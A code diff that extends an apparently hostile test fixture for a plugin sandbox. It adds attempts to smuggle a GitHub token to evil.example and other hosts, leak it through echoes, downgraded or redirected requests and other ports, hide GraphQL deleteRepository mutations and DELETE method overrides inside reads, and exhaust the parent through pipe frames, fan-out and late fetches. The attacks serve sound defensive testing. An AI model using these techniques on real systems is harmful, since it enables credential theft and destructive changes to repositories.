@@ -3,7 +3,7 @@
 // host, every attempt must come back as a placeholder, a refusal or ERR_ACCESS_DENIED; only the
 // network on Node 22 and 24 is out of reach (a stated limit of the security model).
 import { spawnSync } from "node:child_process";
-import { readFileSync, writeFileSync } from "node:fs";
+import { readFileSync, writeFileSync, writeSync } from "node:fs";
 import net from "node:net";
 import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
@@ -25,7 +25,8 @@ export default defineProvider({
   hosts: () => ["api.github.com", "uploads.example.com"],
   credentials: [
     { env: "GITHUB_TOKEN", hosts: ["api.github.com"] },
-    { env: "GITHUB_USER", hosts: ["api.github.com"] },
+    // An identity: not scrubbed from responses, and sent only as the user part of prrla-basic:.
+    { env: "GITHUB_USER", hosts: ["api.github.com"], secret: false },
   ],
   create(options, ctx) {
     return {
@@ -38,6 +39,34 @@ export default defineProvider({
         }
         if (options.slowMs) await new Promise((r) => setTimeout(r, options.slowMs));
         if (options.bigResultBytes) return { changes: [], defaultBranch: "main", limitations: ["x".repeat(options.bigResultBytes)] };
+        // Writes a frame header on the host's own pipe claiming this many bytes, then nothing: the parent must refuse it from the header alone.
+        if (options.rawFrameBytes) {
+          const head = Buffer.alloc(4);
+          head.writeUInt32BE(options.rawFrameBytes);
+          writeSync(3, head);
+          await new Promise(() => {});
+        }
+        // Asks the parent to wait for a very long time, awaited within the call.
+        if (options.sleepMs) {
+          await ctx.sleep(options.sleepMs);
+          return { changes: [], defaultBranch: "main", limitations: ["slept"] };
+        }
+        // Starts this many fetches at once, to make the parent hold them all.
+        if (options.fanOut) {
+          const results = await Promise.allSettled(Array.from({ length: options.fanOut }, (_, i) => ctx.fetch(`https://api.github.com/fan/${i}`)));
+          const codes = results.map((r) => (r.status === "fulfilled" ? "sent" : r.reason.code));
+          return { changes: [], defaultBranch: "main", limitations: [JSON.stringify(codes)] };
+        }
+        // Fetches after the call has returned.
+        if (options.fetchAfterReturn) {
+          setTimeout(() => void ctx.fetch("https://api.github.com/after-return").catch(() => {}), 20);
+          return { changes: [], defaultBranch: "main", limitations: ["returned"] };
+        }
+        // Asks for a wait after the call has returned, to keep pr-rla alive.
+        if (options.sleepAfterReturnMs) {
+          setTimeout(() => void ctx.sleep(options.sleepAfterReturnMs), 20);
+          return { changes: [], defaultBranch: "main", limitations: ["returned"] };
+        }
         const token = `token ${ctx.env.GITHUB_TOKEN}`;
         const seen = {
           envToken: process.env.GITHUB_TOKEN,
@@ -62,6 +91,24 @@ export default defineProvider({
           basicToUndeclaredHost: await attempt(async () => status(await ctx.fetch("https://evil.example/basic", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } }))),
           basicToOtherDeclaredHost: await attempt(async () => status(await ctx.fetch("https://uploads.example.com/basic", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } }))),
           globalFetch: await attempt(async () => status(await fetch("https://evil.example/global"))),
+          // The declared host echoes the token in every form it can: the child must see only placeholders.
+          echoForms: await attempt(async () => {
+            const r = await ctx.fetch("https://api.github.com/echo-forms", { headers: { authorization: token } });
+            return { url: r.url, header: r.headers.get("x-echo"), statusText: r.statusText, body: await r.text() };
+          }),
+          // A participant list naming the user (an identity) reads right: nothing in it is scrubbed.
+          identityEcho: await attempt(async () => (await ctx.fetch("https://api.github.com/participants", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } })).text()),
+          identityAsToken: await attempt(async () => status(await ctx.fetch("https://api.github.com/echo", { headers: { authorization: "token prrla-cred:GITHUB_USER" } }))),
+          // The token only to its exact https origin: not in clear text, not to another port, not after a downgrading redirect.
+          httpDowngrade: await attempt(async () => status(await ctx.fetch("http://api.github.com/echo", { headers: { authorization: token } }))),
+          otherPort: await attempt(async () => status(await ctx.fetch("https://api.github.com:8443/echo", { headers: { authorization: token } }))),
+          redirectDowngrade: await attempt(async () => status(await ctx.fetch("https://api.github.com/downgrade", { headers: { authorization: token } }))),
+          // The placeholder only in authorization: never swapped into a header the host would echo.
+          otherHeader: await attempt(async () => status(await ctx.fetch("https://api.github.com/echo", { headers: { "x-echo": "prrla-cred:GITHUB_TOKEN" } }))),
+          // A write dressed as a read: a mutation in a GraphQL URL (under a query body, or as a GET), and a method override.
+          graphqlPostUrl: await attempt(async () => status(await ctx.fetch("https://api.github.com/graphql?query=mutation%7BdeleteRepository%7D", { method: "POST", headers: { authorization: token, "content-type": "application/json" }, body: JSON.stringify({ query: "query { viewer { login } }" }) }))),
+          graphqlGetMutation: await attempt(async () => status(await ctx.fetch("https://api.github.com/graphql?query=mutation%7BdeleteRepository%7D", { headers: { authorization: token } }))),
+          methodOverride: await attempt(async () => status(await ctx.fetch("https://api.github.com/repos/acme/widgets", { headers: { authorization: token, "x-http-method-override": "DELETE" } }))),
           post: await attempt(async () => status(await ctx.fetch("https://api.github.com/repos/acme/widgets/issues", { method: "POST", body: JSON.stringify({ title: "exfiltrated" }) }))),
           socket: options.socketPort
             ? await attempt(
